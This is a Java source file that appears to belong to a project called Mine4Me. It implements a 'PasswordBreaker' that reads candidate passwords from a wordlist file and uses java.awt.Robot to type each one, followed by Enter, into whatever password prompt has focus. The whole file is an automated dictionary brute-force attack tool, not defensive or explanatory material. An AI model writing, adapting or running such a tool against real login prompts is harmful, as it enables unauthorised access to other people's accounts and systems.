package me.jchianelli7.Mine4Me;

import java.awt.AWTException;
import java.awt.Robot;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;

import javax.swing.KeyStroke;

import com.sun.glass.events.KeyEvent;

public class PasswordBreaker {

	private PasswordThread thread;

	public PasswordBreaker() {
		thread = new PasswordThread("Password");
	}

	public void crack() {
		thread.start();
	}

}

class PasswordThread extends Thread {
	public PasswordThread(String name) {
		super(name);
	}

	public void run() {

		try {
			//BufferedReader in = new BufferedReader(new FileReader("res/lists/40wordcommon.txt"));
			BufferedReader in = new BufferedReader(new FileReader("res/lists/super pwl.txt"));
			
			
			Robot bot = new Robot();

			String line;

			line = in.readLine();
			
			Thread.sleep(3000);

			while (line != null) {
				System.out.println("Trying: " + line);

				for (int i = 0; i < line.length(); i++) {
					char c = Character.toUpperCase(line.charAt(i));
					
					bot.keyPress((int) KeyEvent.class.getField("VK_" + c).getInt(null));
					bot.keyRelease((int) KeyEvent.class.getField("VK_" + c).getInt(null));
					//Thread.sleep(1);
				}
				
				bot.keyPress(KeyEvent.VK_ENTER);
				//Thread.sleep(0, 500000);
				//Thread.sleep(1);
				line = in.readLine();
			}
			
			in.close();
		} catch (AWTException | IOException | InterruptedException | IllegalArgumentException | IllegalAccessException | NoSuchFieldException | SecurityException e) {
			e.printStackTrace();
		}
	}
}
